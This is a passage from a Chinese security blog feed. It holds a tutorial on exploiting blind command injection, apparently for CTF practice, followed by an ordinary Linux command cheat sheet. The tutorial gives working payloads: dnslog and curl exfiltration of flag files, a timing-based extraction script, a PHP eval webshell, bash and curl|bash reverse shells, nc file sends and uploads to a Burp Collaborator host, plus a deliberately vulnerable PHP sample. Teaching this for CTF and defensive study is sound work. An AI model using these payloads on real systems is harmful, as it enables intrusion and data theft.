bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=|curl ip:4444</span><br></pre></td></tr></table></figure><p>如果向目标服务器发起http请求后，公网服务器监听端口得到一些信息，就证明测试点存在命令执行漏洞<br><img src="../../images/loopholes/bindrce/1.png" alt="1.png"></p><h2 id="DNS-请求"><a href="#DNS-请求" class="headerlink" title="DNS 请求"></a>DNS 请求</h2><blockquote><p>如果请求的目标不是ip地址而是域名，那么域名最终还要转化成ip地址，就肯定要做一次域名解析请求。那么假设我有个可控的二级域名，那么它发出三级域名解析的时候，我这边是能够拿到它的域名解析请求的，这就相当于可以配合DNS请求进行命令执行的判断，这一般就被称为dnslog。（要通过dns请求即可通过ping命令，也能通过curl命令，只要对域名进行访问，让域名服务器进行域名解析就可实现。  </p></blockquote><p>去<a href="http://ceye.io/" target="_blank" rel="noopener">ceye.io</a>注册，注册完后会给一个域名<br><img src="../../images/loopholes/bindrce/2.png" alt="1.png"><br>如果有该域名解析请求就会被记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=ls |curl  `whoami`.awa4xw.ceye.io</span><br><span class="line">?cmd=ls |ping  `whoami`.awa4xw.ceye.io</span><br></pre></td></tr></table></figure><p><img src="../../images/loopholes/bindrce/3.png" alt="1.png"></p><h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><p>示例代码：<br>index.php </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-type: text/html; charset=utf-8"</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">$ip=$_REQUEST[<span class="string">'ip'</span>];</span><br><span class="line"><span class="keyword">if</span>($ip)&#123;</span><br><span class="line">    shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="使用-gt-或-gt-gt"><a href="#使用-gt-或-gt-gt" class="headerlink" title="使用&gt;或&gt;&gt;"></a>使用&gt;或&gt;&gt;</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1 |cat  flag.php &gt;flag.txt</span><br></pre></td></tr></table></figure><h3 id="mv-或-cp"><a href="#mv-或-cp" class="headerlink" title="mv 或 cp"></a>mv 或 cp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=1 |mv  flag.php flag.txt</span><br><span class="line">?ip=1 |cp  flag.php flag.txt</span><br></pre></td></tr></table></figure><h3 id="打包压缩"><a href="#打包压缩" class="headerlink" title="打包压缩"></a>打包压缩</h3><p>（1）tar打包或tar打包并压缩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar cvf flag.tar flag.php</span><br><span class="line">tar zcvf flag.tar.gz flag.php</span><br></pre></td></tr></table></figure><p>（2）zip压缩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip flag.zip flag.php</span><br></pre></td></tr></table></figure><h3 id="cut-and-sleep"><a href="#cut-and-sleep" class="headerlink" title="cut and sleep"></a>cut and sleep</h3><p>sed指定读取文件的第几行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php | sed -n <span class="string">'2p'</span></span><br></pre></td></tr></table></figure><p>提取每一行的第3个字节  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cut -b 3 flag文件</span><br></pre></td></tr></table></figure><p>最后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php | sed -n <span class="string">'2p'</span> |cut -b 1</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">"http://119.3.37.185/"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">65</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        data=<span class="string">"a=`cut -b &#123;&#125; /flag*`;[ $a = \"&#123;&#125;\" ] &amp;&amp; sleep 1"</span>.format(i,chr(j))</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        start_time=time.time()</span><br><span class="line">        requests.post(url=url,data=&#123;<span class="string">"cmd"</span>:data&#125;)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        spend_time = end_time - start_time</span><br><span class="line">        <span class="keyword">if</span> spend_time&gt;<span class="number">1</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure><h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><p>直接写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1| <span class="built_in">echo</span> <span class="string">"&lt;?php @eval(\$_POST[9415]); ?&gt;"</span> &gt; webshell.php</span><br></pre></td></tr></table></figure><p>外部下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget 网址 -O webshell.php <span class="comment">#使用wget下载shell，使用参数-O来指定一个文件名</span></span><br></pre></td></tr></table></figure><h2 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h2><blockquote><p>（1）命令执行时要避免空格，空格会导致空格后面的命令执行不到；<br>（2）将读取的文件命令用反引号``包含起来；<br>（3）拼接的域名有长度限制</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#用&lt;替换读取文件中的空格，且对输出结果base64编码</span><br><span class="line">curl &#96;cat&lt;flag.php|base64&#96;</span><br><span class="line"></span><br><span class="line">#拼接域名(最终构造结果)</span><br><span class="line">curl &#96;cat&lt;flag.php|base64&#96;.awa4xw.ceye.io</span><br><span class="line">#另一种方法(不过有的环境下不可以)&#96;cat flag.php|sed s&#x2F;[[:space:]]&#x2F;&#x2F;g&#96;.awa4xw.ceye.io</span><br></pre></td></tr></table></figure><p>这里读取flag.php没有成功   </p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>1.首先在公网服务器使用nc命令监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444 <span class="comment">#或nc -vv -lp 4444</span></span><br></pre></td></tr></table></figure><p>2.然后在公网服务器上写一个文件(我写入到qwzf文件)，内容是下面命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>3.最终浏览器上执行的payload(实际上就是在目标机执行curl x.x.x.x:8002/qwzf|bash)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=|curl x.x.x.x:8002/qwzf|bash</span><br></pre></td></tr></table></figure><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p><strong>tcp</strong><br>1.公网服务器监听4444端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -tlp 4444</span><br></pre></td></tr></table></figure><p>2.目标服务器执行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=|nc -t x.x.x.x 4444 &lt; flag.php</span><br></pre></td></tr></table></figure><p>-u参数调整为udp,当tcp不能使用的时候使用 </p><p><strong>udp</strong>    </p><p>1.公网服务器监听4444端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -ulp 4444</span><br></pre></td></tr></table></figure><p>2.目标服务器执行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=|nc -u x.x.x.x 4444 &lt; flag.php</span><br></pre></td></tr></table></figure><h2 id="curl上传文件读取源码"><a href="#curl上传文件读取源码" class="headerlink" title="curl上传文件读取源码"></a>curl上传文件读取源码</h2><p>利用条件：目标服务器curl命令可以正常执行</p><p>使用curl -F将flag文件上传到Burp的Collaborator Client(Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看POST请求包以及打Cookies)</p><p>1.获取Collaborator Client分配给Burp的链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">打开Burp主界面 -&gt; 菜单（Burp）-&gt; Collaboraor Client -&gt; 点击</span><br><span class="line">Copy to Clipboard</span><br></pre></td></tr></table></figure><p>2.拼接payload并在命令执行处提交</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=1|curl -X  POST -F xx=@flag.php http://6hoo9jdwyggr4rkwrgoy1f51bshi57.burpcollaborator.net</span><br></pre></td></tr></table></figure><p>3.查看Collaborator Client收到的数据<br><img src="../../images/loopholes/bindrce/4.png" alt="1.png"></p><p>参考文章：<br><a href="https://xz.aliyun.com/t/8125" target="_blank" rel="noopener">浅谈PHP无回显命令执行的利用</a><br><a href="https://cloud.tencent.com/developer/article/1523441" target="_blank" rel="noopener">CTF入门web篇18命令执行无回显的判断方法及dnslog相关例题</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;命令执行可能会存在命令执行但没有回显，所以首先要判断命令是否有执行。确定命令可以执行，然后就可以进行无回显命令执行的利用了。    &lt;/p&gt;
    
    </summary>
    
    
      <category term="web安全" scheme="https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="无回显命令执行" scheme="https://blog.cfyqy.com/tags/%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>linux 常用命令记录</title>
    <link href="https://blog.cfyqy.com/article/8a65f310.html"/>
    <id>https://blog.cfyqy.com/article/8a65f310.html</id>
    <published>2020-09-09T01:54:00.000Z</published>
    <updated>2021-01-31T14:53:43.122Z</updated>
    
    <content type="html"><![CDATA[<p>记录自己常用的 Linux 命令</p><a id="more"></a><h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><p>创建后台进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup sudo ./Cardinal &gt; output.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><p>删除某个程序的所有进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep Cardinal | grep -v grep | awk <span class="string">'&#123;print $2&#125;'</span>|sudo xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps -ef | grep spiderks.py | grep -v grep | cut -c 9-15 | xargs <span class="built_in">kill</span> -9</span><br></pre></td></tr></table></figure><h1 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h1><p>创建用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd -g <span class="built_in">test</span> -d /home/test1 -s /etc/bash -m test1</span><br><span class="line"><span class="comment">#注解：-g 所属组  -d 家目录  -s 所用的SHELL</span></span><br></pre></td></tr></table></figure><p>删除用户命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userdel -r test1</span><br></pre></td></tr></table></figure><p>创建密码命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure><p>设置普通用户允许sudo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod u+w /etc/sudoers</span><br><span class="line">sudo vi /etc/sudoers <span class="comment">#在root    ALL=(ALL:ALL) ALL下添加  用户 ALL=(ALL:ALL) ALL  </span></span><br><span class="line">sudo chmod u-w /etc/sudoers</span><br></pre></td></tr></table></figure><h1 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h1><h1 id="定时"><a href="#定时" class="headerlink" title="定时"></a>定时</h1><p>新建定时文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/cron.d/FreshRSS</span><br></pre></td></tr></table></figure><p>FreshRSS内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/30 * * * * root php /var/www/rss/FreshRSS/app/actualize_script.php &gt; /tmp/FreshRSS.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><p>查看crontab 是否启动成功，检测crontab 服务是否启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/cron status</span><br></pre></td></tr></table></figure><p>没启动则要用下面命令启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/cron start</span><br></pre></td></tr></table></figure><h1 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h1><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>查看docker占用的存储</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker system df</span><br></pre></td></tr></table></figure><p>docker批量停止某类型的容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps |grep web_14|awk <span class="string">'&#123;print $1&#125;'</span>| sudo  xargs docker stop</span><br></pre></td></tr></table></figure><p>docker 批量启动某类型容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps -a|grep web_14|awk <span class="string">'&#123;print $1&#125;'</span>| sudo  xargs docker start</span><br></pre></td></tr></table></figure><p>从宿主机拷文件到容器里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从容器里面拷文件到宿主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 容器名：要拷贝的文件在容器里面的路径       要拷贝到宿主机的相应路径</span><br></pre></td></tr></table></figure><h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>iptables是隔离主机以及网络的工具，通过自己设定的规则以及处理动作对数据报文进行检测以及处理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t 表名 &lt;-A/I/D/R&gt; 规则链名 [规则号] &lt;-i/o 网卡名&gt; -p 协议名 &lt;-s 源IP/源子网&gt; --sport 源端口 &lt;-d 目标IP/目标子网&gt; --dport 目标端口 -j 动作</span><br></pre></td></tr></table></figure><p>表<br>filter表：确定是否放行该数据包（过滤）<br>nat表：修改数据包中的源、目标IP地址或端口<br>managle表：为数据包设置标记<br>raw表：确定是否对该数据包进行状态跟踪   </p><p>规则链名：<br>INPUT 本机进站的数据流 (路由前)<br>OUTPUT 本机出站的数据流 (数据包流入口)<br>FORWARD 路由的数据流 (转发管卡)<br>POSTROUTING 路由后的数据流(数据包出口)<br>PREROUTING 路由前的数据流 (路由后)   </p><p>表跟链的对应关系：   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filter: INPUT——OUTPUT——FORWARD   </span><br><span class="line">nat: OUTPUT——PREROUTING——POSTROUTING  </span><br><span class="line">mangle: INPUT——OUTPUT——FORWARD——PREROUTING——POSTROUTING</span><br></pre></td></tr></table></figure><p>动作包括：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">accept：接收数据包。</span><br><span class="line">DROP：丢弃数据包。</span><br><span class="line">REDIRECT：重定向、映射、透明代理。</span><br><span class="line">SNAT：源地址转换。</span><br><span class="line">DNAT：目标地址转换。</span><br><span class="line">MASQUERADE：IP伪装（NAT），用于ADSL。</span><br><span class="line">LOG：日志记录</span><br></pre></td></tr></table></figure><p>堵通策略<br>是指对数据包所做的操作，一般有两种操作——“通（ACCEPT）”、“堵（DROP）”，还有一种操作很常见REJECT.</p><p>谈谈REJECT和DROP之间的区别，Ming写了一封信，向Rose示爱。Rose如果不愿意接受，她可以不回应Ming,这个时候Ming不确定Rose是否接到了信；Rose也可以同样写一封信，在信中明确地拒绝Ming。前一种操作就如同执行了DROP操作，而后一种操作就如同REJECT操作。</p><p>查看iptables列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -nL</span><br></pre></td></tr></table></figure><p>iptables命令的管理控制选项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-A  在指定链的末尾添加（append）一条新的规则</span><br><span class="line">-D  删除（delete）指定链中的某一条规则，可以按规则序号和内容删除</span><br><span class="line">-I  在指定链中插入（insert）一条新的规则，默认在第一行添加</span><br><span class="line">-R  修改、替换（replace）指定链中的某一条规则，可以按规则序号和内容替换</span><br><span class="line">-L  列出（list）指定链中所有的规则进行查看</span><br><span class="line">-E  重命名用户定义的链，不改变链本身</span><br><span class="line">-F  清空（flush）</span><br><span class="line">-N  新建（new-chain）一条用户自己定义的规则链</span><br><span class="line">-X  删除指定表中用户自定义的规则链（delete-chain）</span><br><span class="line">-P  设置指定链的默认策略（policy）</span><br><span class="line">-Z 将所有表的所有链的字节和数据包计数器清零</span><br><span class="line">-n  使用数字形式（numeric）显示输出结果</span><br><span class="line">-v  查看规则表详细信息（verbose）的信息</span><br><span class="line">-V  查看版本(version)</span><br><span class="line">-h  获取帮助（<span class="built_in">help</span>）</span><br></pre></td></tr></table></figure><p><strong>常用实例</strong></p><p>1、清除已有iptables规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -F </span><br><span class="line">iptables -X </span><br><span class="line">iptables -Z</span><br></pre></td></tr></table></figure><p>2、开放指定的端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT <span class="comment">#允许本地回环接口(即运行本机访问本机) </span></span><br><span class="line">iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT <span class="comment">#允许已建立的或相关连的通行 </span></span><br><span class="line">iptables -A OUTPUT -j ACCEPT <span class="comment">#允许所有本机向外的访问 </span></span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT <span class="comment">#允许访问22端口 </span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT <span class="comment">#允许访问80端口 </span></span><br><span class="line">iptables -A INPUT -p tcp --dport 21 -j ACCEPT <span class="comment">#允许ftp服务的21端口 </span></span><br><span class="line">iptables -A INPUT -p tcp --dport 20 -j ACCEPT <span class="comment">#允许FTP服务的20端口 </span></span><br><span class="line">iptables -A INPUT -j reject <span class="comment">#禁止其他未允许的规则访问 </span></span><br><span class="line">iptables -A FORWARD -j REJECT <span class="comment">#禁止其他未允许的规则访问</span></span><br></pre></td></tr></table></figure><p>3、屏蔽IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -s 123.45.6.7 -j DROP <span class="comment">#屏蔽单个IP的命令 </span></span><br><span class="line">iptables -I INPUT -s 123.0.0.0/8 -j DROP <span class="comment">#封整个段即从123.0.0.1到123.255.255.254的命令 </span></span><br><span class="line">iptables -I INPUT -s 124.45.0.0/16 -j DROP <span class="comment">#封IP段即从123.45.0.1到123.45.255.254的命令 </span></span><br><span class="line">iptables -I INPUT -s 123.45.6.0/24 -j DROP <span class="comment">#封IP段即从123.45.6.1到123.45.6.254的命令</span></span><br></pre></td></tr></table></figure><p>4、查看已添加的iptables规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -L -n -v</span><br></pre></td></tr></table></figure><p>5、删除已添加的iptables规则</p><p>将所有iptables以序号标记显示，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -L -n --line-numbers</span><br></pre></td></tr></table></figure><p>比如要删除INPUT里序号为8的规则，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -D INPUT 8</span><br></pre></td></tr></table></figure><p>参考文章：   </p><p>Linux防火墙iptables规则设置：<a href="https://www.cnblogs.com/zaizai1573/p/11885271.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaizai1573/p/11885271.html</a> </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录自己常用的 Linux 命令&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
</feed>
